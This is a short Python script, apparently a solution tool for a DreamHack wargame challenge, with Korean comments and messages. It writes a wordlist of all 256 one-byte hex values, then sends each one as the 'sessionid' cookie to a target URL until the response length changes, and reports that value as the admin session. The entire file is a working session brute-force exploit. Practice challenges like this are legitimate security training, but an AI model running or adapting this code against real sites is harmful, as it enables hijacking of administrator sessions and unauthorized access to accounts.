import requests
import argparse
import sys

parser = argparse.ArgumentParser(description="[DreamHack] session exploit tool.")

parser.add_argument('-u', '--url', dest='URL', help="로그인해서 열은 해당 문제의 사이트의 URL로 exploit (ex.http://host3.dreamhack.games:0000/)")
parser.add_argument('-c', '--create', dest='CREATE', help="1바이트 크기의 16진수 파일 만들기", action='store_true')

args = parser.parse_args()

url = args.URL


if args.CREATE:
    with open('session_burt_force.txt', 'w') as f:
        for i in range(256):
            hex_string = format(i, '02x')
            f.write(hex_string + '\n')
    print("File 'session_burt_force.txt' successfully created.")


if args.URL:
    try:
        with open('session_burt_force.txt', 'r') as f:
            hex_list = f.read().splitlines()
    except:
        print("-c 옵션으로 파일을 생성해주세요.")
        sys.exit()

    try:
        response_len = requests.get(url)
    except:
        print("유효하지 않는 URL입니다.")
        sys.exit()
            
    initial_response_len = len(response_len.text)

    for cookie in hex_list:
        head = {"sessionid": f"{cookie}"}
        response = requests.get(url, cookies=head)
        print(cookie)

        if len(response.text) != initial_response_len:      # 세션변경을 조금 진행해봤을 때 admin 세션이 아닌경우 길이의 차이가 없기에 이렇게 했습니다.
            print(f'admin session is "{cookie}"')
            break

elif not args.CREATE: 
    print("URL을 지정하세요. (-h, --help)")

